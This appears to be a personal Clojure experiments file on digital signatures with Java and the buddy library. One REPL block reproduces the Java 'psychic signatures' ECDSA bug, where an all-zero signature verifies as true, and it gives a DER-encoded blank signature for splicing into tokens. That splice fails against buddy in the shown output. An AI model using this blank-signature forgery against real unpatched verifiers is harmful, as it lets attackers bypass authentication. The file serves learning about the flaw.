(ns clojure-experiments.security.signing
  (:require [buddy.core.codecs :as codecs]
            [buddy.core.codecs.base64 :as b64]
            [buddy.core.dsa :as dsa]
            [buddy.core.keys :as buddy-keys]
            [buddy.sign.compact :as sign]
            [clojure.java.io :as io]))

;;; Java EC vulnerability
;;; https://neilmadden.blog/2022/04/19/psychic-signatures-in-java/
(comment

  (def kpg (java.security.KeyPairGenerator/getInstance "EC"))
  (def my-keys (.generateKeyPair kpg))
  (def blank-signature (byte-array 64))
  ;; Note that the “InP1363Format” qualifier just makes it easier to demonstrate the bug.
  ;; Signatures in ASN.1 DER format can be exploited in the same way, you just have to do a bit more fiddling with the encoding first,
  ;; but note that JWTs and other formats do use the raw IEEE P1363 format.
  (def signature (java.security.Signature/getInstance "SHA256WithECDSAInP1363Format"))

  (doto signature
    (.initVerify (.getPublic my-keys))
    (.update (.getBytes "Hello World")))

  (.verify signature blank-signature)
  ;; WHOOPS!
  ;; => true


  ;; how hard it is to do with ordinary DER format? 
  ;; convert to DER encoding: https://replit.com/@javacrypto/CpcJavaEcSignatureConvertP1363ToDer#Main.java/
  ;; (see https://github.com/java-crypto/cross_platform_crypto/blob/main/docs/ecdsa_signature_ieee_p1363_string.md)
  ;; My Java Code for the conversion is here: https://github.com/jumarko/api-security-in-action/blob/main/natter-api/src/main/java/random/CpcJavaEcSignatureConvertP1363ToDer.java

  (String. (b64/encode blank-signature true))
  ;; => "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

  ;; DER encoding for blank signature (as per the conversion code)
  "MAYCAQACAQA"

  #_(def signature (java.security.Signature/getInstance "SHA256WithECDSA"))

  (sign/sign {:user "jumarko"}
             (.getEncoded (.getPrivate my-keys))
             :alg :es256)
  ;; => "TlBZARFAcAFqBHVzZXJpB2p1bWFya28.zte-zvVmpGop74clF5257qy73jW8nXw0A0HACwm8qNs.MRLxxQoUM8_j5Rj3.AAAAAGJhCqY"

  (sign/unsign "TlBZARFAcAFqBHVzZXJpB2p1bWFya28.zte-zvVmpGop74clF5257qy73jW8nXw0A0HACwm8qNs.MRLxxQoUM8_j5Rj3.AAAAAGJhCqY"
               (.getEncoded (.getPrivate my-keys))
               :alg :es256)
;; => {:user "jumarko"}

  ;; tamper the signature by replacing the signature (the substring between the first and the second dot)
  ;; with blank signature "MAYCAQACAQA"
  (sign/unsign "TlBZARFAcAFqBHVzZXJpB2p1bWFya28.MAYCAQACAQA.MRLxxQoUM8_j5Rj3.AAAAAGJhCqY"
               (.getEncoded (.getPrivate my-keys))
               :alg :es256)
  ;; 1. Unhandled clojure.lang.ExceptionInfo
  ;; Message seems corrupt or manipulated.
  ;; {:type :validation, :cause :signature}

  (sign/sign "test"
             (.getEncoded (.getPrivate my-keys))
             :alg :es256)
;; => "TlBZAQYUaQR0ZXN0.uhZy5Og6vewNSCPK_12SjIx-yx1m3bbTBwdusj_ILuE.qdHKudHdDbK9A19Y.AAAAAGO3KtA"
;; => "TlBZAQYUaQR0ZXN0.njbl3zitaL5MGzoWH_F-fuvVs7fHehipYrHxn-UIHNk.VjldedntwJVdDbVv.AAAAAGO3Ks8"

  .)


;;; experimenting with digital signatures and buddy
;;; https://clojurians.slack.com/archives/CLX41ASCS/p1672919438407929
(comment 
  (-> (dsa/sign (.getBytes "test") {:alg :ecdsa+sha256 :key (.getPrivate my-keys)})
      (codecs/bytes->b64)
      (codecs/bytes->str))
  ;; => "MGUCMFCNZQYKUVX0yeqseZfuzzm8CYy2WfxdQ5aznXpqejkVHEFtMdHfz4bDP3iBe2xsmwIxAJCG9JC6ieAqHXy1a+oPacxuYJUBKXx7Fz0Geg0x4mRYTS1wXpV+62vp8rnc2EJY3Q=="
  ;; => "MGQCMAZATs4mRfu6eaPnYpW8woJaGqJCQtLR9iV7TEKqrisHz6JI6QoWAYh3b21esFxHLwIwZO5arz8++L8lS+1yn/scCtUcEjAVXgraEWESvca5H+8XYLySWmP9it4ZrRiD8vIF"

  
  (def my-private-key (buddy-keys/private-key "...signing-key.pem"))
  (def my-public-key (buddy-keys/public-key "...signing-key.pub.pem"))

  (sign/sign "test" (.getEncoded my-private-key) :alg :es256)
  ;; => "TlBZAQYUaQR0ZXN0.RJsOFKWMZmDNRsNuAkl4eG_6z2mlbBCwp7UemuDlH-s.rkw6rl3KV9c-zt5n.AAAAAGO3PU0"

  (-> (dsa/sign (.getBytes "test") {:alg :ecdsa+sha256 :key my-private-key})
      (codecs/bytes->b64)
      (codecs/bytes->str))
  ;; => "MEQCIF+nol0Ih7LsJ35P5pPS2glpZ8sTZuuZiCpoTliDEaM1AiA/GQrjeGvFQkbZNXyo9MxqO3zGwyUjvYaP2QlYeq4adw=="
  ;; => "MEYCIQDJUPFSxkZWwB0efZW1o8Sm0Jz/jtovjGWZVRPI0ceXSAIhAJlYK/Pk1DA90XbDL27p41zoAVPYMpFXVB7CkT5aQxwe"
  ;; => "MEUCIEmhdaIGo6rd7v57Qi8QKYBhSmAORsHTPE0JOk1CyanEAiEAof2X0ZkD7gxViT5a1LY7WyYp2R2e6UxT7y/uyNMK610="
  ;; compare to openssl
  ;;   MEYCIQDeyprlUaXc58vUF6tOR4DIgXMdh31qsiCghevhSIyyEQIhALnAw6I3lkLkTaouLDgua+eoCQKDse13EeU2NTQ/04wk


  (let [signature  (dsa/sign (.getBytes "test") {:alg :ecdsa+sha256 :key my-private-key})]
    (with-open [out (io/output-stream (io/file "test.sign.clojure"))]
      (.write out signature)))

  ;; verify with openssl
  ;; echo -n test | openssl dgst -sha256 -verify signing-key.pub.pem -signature test.sign.clojure
  ;; Verified OK

  ,)

;; get list of all available signing algorithms
;; https://stackoverflow.com/questions/9333504/how-can-i-list-the-available-cipher-algorithms#comment85875356_9333504
(comment
  (run! println (java.security.Security/getAlgorithms "Signature")))






